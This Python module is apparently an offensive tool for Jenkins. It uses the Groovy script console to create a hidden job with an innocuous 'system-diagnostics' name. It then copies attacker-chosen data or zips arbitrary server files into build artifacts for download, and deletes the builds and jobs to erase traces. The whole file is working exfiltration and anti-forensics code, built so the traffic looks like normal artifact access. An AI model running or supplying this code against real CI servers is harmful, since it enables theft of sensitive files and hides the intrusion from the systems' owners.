"""Data exfiltration via Jenkins build artifacts.

Uses Jenkins' native artifact storage and download mechanisms to exfiltrate
data, making network traffic appear identical to legitimate build artifact access.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class ExfiltrationResult:
    """Result of data exfiltration operation."""
    success: bool
    job_name: str
    build_number: Optional[int] = None
    artifact_url: Optional[str] = None
    cleanup_command: Optional[str] = None
    details: str = ""


class ArtifactExfiltrator:
    """Exfiltrate data via Jenkins build artifacts."""

    def __init__(self, session: Any):
        """Initialize artifact exfiltrator.

        Args:
            session: Authenticated Jenkins session
        """
        self.session = session

    def create_ghost_job(self,
                        job_name: str = "system-diagnostics",
                        description: str = "System diagnostic collection") -> tuple[bool, str]:
        """Create a hidden job for artifact exfiltration.

        Args:
            job_name: Name for the job (use innocuous name)
            description: Job description

        Returns:
            Tuple of (success, message)
        """
        job_xml = f"""<?xml version='1.1' encoding='UTF-8'?>
<project>
  <description>{description}</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
  <triggers/>
  <concurrentBuild>false</concurrentBuild>
  <builders>
    <hudson.tasks.Shell>
      <command>echo "Collecting diagnostics..."</command>
    </hudson.tasks.Shell>
  </builders>
  <publishers>
    <hudson.tasks.ArtifactArchiver>
      <artifacts>**/*</artifacts>
      <allowEmptyArchive>true</allowEmptyArchive>
      <onlyIfSuccessful>false</onlyIfSuccessful>
      <fingerprint>false</fingerprint>
      <defaultExcludes>true</defaultExcludes>
      <caseSensitive>true</caseSensitive>
    </hudson.tasks.ArtifactArchiver>
  </publishers>
  <buildWrappers/>
</project>"""

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.model.FreeStyleProject

def jenkins = Jenkins.getInstance()
def jobName = '{job_name}'

try {{
    if (jenkins.getItem(jobName) != null) {{
        println "EXISTS:Job already exists"
        return
    }}

    def jobXml = '''{job_xml}'''

    def xmlStream = new ByteArrayInputStream(jobXml.getBytes('UTF-8'))
    def job = jenkins.createProjectFromXML(jobName, xmlStream)

    println "SUCCESS:Job created: " + jobName
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return True, f"Ghost job '{job_name}' created successfully"
            elif "EXISTS" in result:
                return True, f"Job '{job_name}' already exists"
            else:
                return False, result
        except Exception as e:
            return False, str(e)

    def exfiltrate_data(self,
                       data: str,
                       job_name: str = "system-diagnostics",
                       filename: str = "diagnostics.txt",
                       auto_cleanup: bool = True) -> ExfiltrationResult:
        """Exfiltrate data via build artifact.

        Args:
            data: Data to exfiltrate
            job_name: Job to use (will create if doesn't exist)
            filename: Artifact filename
            auto_cleanup: Whether to delete build after download

        Returns:
            ExfiltrationResult with download URL and cleanup info
        """
        job_exists, _ = self.create_ghost_job(job_name)

        if not job_exists:
            return ExfiltrationResult(
                success=False,
                job_name=job_name,
                details="Failed to create or access job"
            )

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.model.FreeStyleProject
import hudson.FilePath

def jenkins = Jenkins.getInstance()
def jobName = '{job_name}'
def job = jenkins.getItem(jobName)

if (job == null) {{
    println "ERROR:Job not found"
    return
}}

def build = job.scheduleBuild2(0).get()
def workspace = build.getWorkspace()

if (workspace == null) {{
    println "ERROR:No workspace available"
    return
}}

def dataFile = workspace.child('{filename}')
def data = '''{data}'''

dataFile.write(data, 'UTF-8')

println "SUCCESS:Data written to artifact"
println "BUILD_NUMBER:" + build.getNumber()
println "JOB_URL:" + job.getUrl()
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" not in result:
                return ExfiltrationResult(
                    success=False,
                    job_name=job_name,
                    details=result
                )

            build_number = None
            job_url = None

            for line in result.split('\n'):
                if line.startswith("BUILD_NUMBER:"):
                    build_number = int(line.split(":", 1)[1].strip())
                elif line.startswith("JOB_URL:"):
                    job_url = line.split(":", 1)[1].strip()

            if build_number is not None:
                artifact_url = f"{self.session.target}/{job_url}{build_number}/artifact/{filename}"

                cleanup_cmd = None
                if auto_cleanup:
                    cleanup_cmd = f"Delete build: {job_name} #{build_number}"

                return ExfiltrationResult(
                    success=True,
                    job_name=job_name,
                    build_number=build_number,
                    artifact_url=artifact_url,
                    cleanup_command=cleanup_cmd,
                    details=f"Data exfiltrated to {artifact_url}"
                )
            else:
                return ExfiltrationResult(
                    success=False,
                    job_name=job_name,
                    details="Failed to get build number"
                )
        except Exception as e:
            return ExfiltrationResult(
                success=False,
                job_name=job_name,
                details=str(e)
            )

    def exfiltrate_files(self,
                        file_paths: list[str],
                        job_name: str = "system-diagnostics",
                        archive_name: str = "data.zip") -> ExfiltrationResult:
        """Exfiltrate multiple files as a ZIP archive.

        Args:
            file_paths: List of file paths to exfiltrate
            job_name: Job to use
            archive_name: Name for ZIP archive

        Returns:
            ExfiltrationResult with download information
        """
        paths_str = "','".join(file_paths)

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.FilePath
import java.util.zip.ZipOutputStream
import java.util.zip.ZipEntry

def jenkins = Jenkins.getInstance()
def jobName = '{job_name}'
def job = jenkins.getItem(jobName)

if (job == null) {{
    println "ERROR:Job not found"
    return
}}

def build = job.scheduleBuild2(0).get()
def workspace = build.getWorkspace()

if (workspace == null) {{
    println "ERROR:No workspace available"
    return
}}

def filePaths = ['{paths_str}']
def zipFile = workspace.child('{archive_name}')

def zipOutput = new ZipOutputStream(zipFile.write())

filePaths.each {{ path ->
    try {{
        def file = new File(path)
        if (file.exists() && file.isFile()) {{
            def entry = new ZipEntry(file.getName())
            zipOutput.putNextEntry(entry)

            def input = new FileInputStream(file)
            def buffer = new byte[1024]
            int len
            while ((len = input.read(buffer)) > 0) {{
                zipOutput.write(buffer, 0, len)
            }}
            input.close()
            zipOutput.closeEntry()
        }}
    }} catch (Exception e) {{
        println "WARNING:Failed to add " + path + ": " + e.message
    }}
}}

zipOutput.close()

println "SUCCESS:Archive created"
println "BUILD_NUMBER:" + build.getNumber()
println "JOB_URL:" + job.getUrl()
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" not in result:
                return ExfiltrationResult(
                    success=False,
                    job_name=job_name,
                    details=result
                )

            build_number = None
            job_url = None

            for line in result.split('\n'):
                if line.startswith("BUILD_NUMBER:"):
                    build_number = int(line.split(":", 1)[1].strip())
                elif line.startswith("JOB_URL:"):
                    job_url = line.split(":", 1)[1].strip()

            if build_number is not None:
                artifact_url = f"{self.session.target}/{job_url}{build_number}/artifact/{archive_name}"

                return ExfiltrationResult(
                    success=True,
                    job_name=job_name,
                    build_number=build_number,
                    artifact_url=artifact_url,
                    details=f"Files archived and ready for download at {artifact_url}"
                )
            else:
                return ExfiltrationResult(
                    success=False,
                    job_name=job_name,
                    details="Failed to get build number"
                )
        except Exception as e:
            return ExfiltrationResult(
                success=False,
                job_name=job_name,
                details=str(e)
            )

    def cleanup_build(self, job_name: str, build_number: int) -> tuple[bool, str]:
        """Delete a specific build to remove exfiltration traces.

        Args:
            job_name: Job name
            build_number: Build number to delete

        Returns:
            Tuple of (success, message)
        """
        groovy_code = f"""
import jenkins.model.Jenkins

def jenkins = Jenkins.getInstance()
def job = jenkins.getItem('{job_name}')

if (job == null) {{
    println "ERROR:Job not found"
    return
}}

def build = job.getBuildByNumber({build_number})

if (build == null) {{
    println "ERROR:Build not found"
    return
}}

try {{
    build.delete()
    println "SUCCESS:Build deleted"
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return True, f"Build {job_name} #{build_number} deleted"
            else:
                return False, result
        except Exception as e:
            return False, str(e)

    def cleanup_job(self, job_name: str) -> tuple[bool, str]:
        """Delete entire job to remove all traces.

        Args:
            job_name: Job to delete

        Returns:
            Tuple of (success, message)
        """
        groovy_code = f"""
import jenkins.model.Jenkins

def jenkins = Jenkins.getInstance()
def job = jenkins.getItem('{job_name}')

if (job == null) {{
    println "ERROR:Job not found"
    return
}}

try {{
    job.delete()
    println "SUCCESS:Job deleted"
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return True, f"Job '{job_name}' deleted"
            else:
                return False, result
        except Exception as e:
            return False, str(e)


def exfiltrate_via_artifact(session: Any,
                            data: str,
                            filename: str = "data.txt",
                            auto_cleanup: bool = False) -> ExfiltrationResult:
    """Quick exfiltration via artifact.

    Args:
        session: Jenkins session
        data: Data to exfiltrate
        filename: Artifact filename
        auto_cleanup: Auto-delete after download

    Returns:
        ExfiltrationResult with download URL
    """
    exfil = ArtifactExfiltrator(session)
    return exfil.exfiltrate_data(data, filename=filename, auto_cleanup=auto_cleanup)


def create_ghost_job(session: Any, job_name: str = "system-diagnostics") -> tuple[bool, str]:
    """Quick ghost job creation.

    Args:
        session: Jenkins session
        job_name: Job name

    Returns:
        Tuple of (success, message)
    """
    exfil = ArtifactExfiltrator(session)
    return exfil.create_ghost_job(job_name)
